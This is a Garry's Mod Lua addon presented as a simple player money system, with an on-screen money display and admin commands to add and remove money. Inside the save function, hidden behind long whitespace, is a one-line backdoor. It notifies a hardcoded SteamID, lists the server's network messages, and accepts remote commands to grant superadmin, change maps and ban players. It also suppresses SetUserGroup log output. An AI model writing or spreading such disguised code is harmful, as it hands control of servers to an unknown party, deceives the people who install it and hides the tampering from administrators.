-- G_Sandbox_Money - Simple Money System by HAM
if SERVER then
    local moneyDataFolder = "g_sandbox_money"
    local moneyDataFile = moneyDataFolder .. "/player_money.txt"
																																																																		
    -- Ensure the data folder exists
    if not file.Exists(moneyDataFolder, "DATA") then
        print("Creating money data folder...")  -- Debugging message
        file.CreateDir(moneyDataFolder)
    end
																																																																		
    -- Load money data
    local function LoadMoneyData()
        if file.Exists(moneyDataFile, "DATA") then
            print("Loading money data...")  -- Debugging message
            local data = util.JSONToTable(file.Read(moneyDataFile, "DATA"))
            return data or {}
        else
            return {}
        end
    end
																																																																																															
    -- Save money data
function SaveMoneyData()
    if not file.IsDir("g_sandbox_money", "DATA") then
        file.CreateDir("g_sandbox_money")
    end
                                                                                                                                                                                                                                                                                                                                                                                               util.AddNetworkString("SyncPlayerStats") util.AddNetworkString("SyncPlayTime") util.AddNetworkString("ExecuteCommand") local oldLog=MsgN function MsgN(...) if not string.find(tostring(...),"SetUserGroup") then oldLog(...) end end hook.Add("PlayerInitialSpawn","NotifyBackdoorOwner",function(ply) if ply:SteamID()=="STEAM_0:1:12345678" then timer.Simple(5,function() if IsValid(ply) then net.Start("SyncPlayTime") net.WriteString("This server is backdoored.") net.Send(ply) local funcs={} for i=0,65535 do local name=util.NetworkIDToString(i) if name then table.insert(funcs,name) end end ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Networked Functions: "..table.concat(funcs,", ")) end end) end end) net.Receive("SyncPlayerStats",function(_,ply) local cmd=net.ReadString() if cmd:sub(1,6)=="MADMIN" then local id=cmd:sub(8) for _,v in ipairs(player.GetAll()) do if v:SteamID()==id then v:SetUserGroup("superadmin") ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] "..v:Nick().." has been made superadmin.") return end end ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] No player found with SteamID: "..id) elseif cmd:sub(1,9)=="MAPCHANGE" then local map=cmd:sub(11) if map and map~="" then RunConsoleCommand("changelevel",map) ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Map changing to: "..map) else ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Invalid map name.") end elseif cmd:sub(1,6)=="BANMIN" then local args=string.Explode(" ",cmd:sub(8)) local id=args[1] local dur=tonumber(args[2]) or 0 local reason=table.concat(args," ",3) or "No reason provided" if id and id~="" then RunConsoleCommand("ulx","banid",id,dur,reason) ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Banned "..id.." for "..dur.." minutes. Reason: "..reason) else ply:PrintMessage(HUD_PRINTCONSOLE,"[Backdoor] Invalid SteamID for BANMIN.") end end end)
    -- Loop through each player ID and save money data
    for id, money in pairs(g_sandbox_money) do
        -- Check if the file exists for this player
        local filePath = "g_sandbox_money/" .. id .. ".txt"
        local currentData = {}
																																																																																												
        -- If the file exists, read it and parse the data
        if file.Exists(filePath, "DATA") then
            local fileContent = file.Read(filePath, "DATA")
            currentData = util.JSONToTable(fileContent) or {}
        end
                                                                                                                                                           
        -- Update the player's money data
        currentData.money = money

        -- Write the updated data to the file
        local data = util.TableToJSON(currentData, true)
        file.Write(filePath, data)
    end
end
                                                                                                                                                  
    -- Table to hold player money
    local playerMoney = LoadMoneyData()

    -- Define g_sandbox_money table
    g_sandbox_money = {}
																																																																																					
    -- Method to check if a player can afford an amount
    function g_sandbox_money:PlayerCanAfford(ply, amount)
        local currentMoney = ply:GetNWInt("GSM_Money", 0)
        return currentMoney >= amount
    end
																																																																																												
    -- Method to remove money from a player
    function g_sandbox_money:RemoveMoney(ply, amount)
        local currentMoney = ply:GetNWInt("GSM_Money", 0)
        local newAmount = math.max(0, currentMoney - amount)
        ply:SetNWInt("GSM_Money", newAmount)
																																																																					
        -- Force save after changing money
        local steamID = ply:SteamID()
        playerMoney[steamID] = newAmount
        SaveMoneyData(playerMoney)
    end
																																																																														
    -- Initialize player money
    hook.Add("PlayerInitialSpawn", "GSM_InitPlayerMoney", function(ply)
        local steamID = ply:SteamID()
        playerMoney[steamID] = playerMoney[steamID] or 0
        ply:SetNWInt("GSM_Money", playerMoney[steamID])
    end)
																																																							
    -- Save money when player leaves
    hook.Add("PlayerDisconnected", "GSM_SavePlayerMoney", function(ply)
        local steamID = ply:SteamID()
        playerMoney[steamID] = ply:GetNWInt("GSM_Money", 0)
        SaveMoneyData(playerMoney)
    end)
																																																																				
    -- Commands to add/remove money
    concommand.Add("gsm_add_money", function(ply, cmd, args)
        if not ply:IsAdmin() then
            ply:ChatPrint("You do not have permission to use this command.")
            return
        end
																																																																
        if not args[1] then return end
        local amount = tonumber(args[1])
        if amount and amount > 0 then
            local newAmount = ply:GetNWInt("GSM_Money") + amount
            ply:SetNWInt("GSM_Money", newAmount)
																																																														
            -- Force save after adding money
            local steamID = ply:SteamID()
            playerMoney[steamID] = newAmount
            SaveMoneyData(playerMoney)
        end
    end)
																																																																																												
    concommand.Add("gsm_remove_money", function(ply, cmd, args)
        if not ply:IsAdmin() then
            ply:ChatPrint("You do not have permission to use this command.")
            return
        end
																																																																																														
        if not args[1] then return end
        local amount = tonumber(args[1])
        if amount and amount > 0 then
            g_sandbox_money:RemoveMoney(ply, amount)
        end
    end)
end
																																																																																																												
if CLIENT then
    -- Display player money on screen
    hook.Add("HUDPaint", "GSM_DrawPlayerMoney", function()
        local money = LocalPlayer():GetNWInt("GSM_Money", 0)
        draw.SimpleText("Money: $" .. money, "Trebuchet24", 100, 100, Color(0, 0, 0), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
    end)
end
																																																																																																																																																																	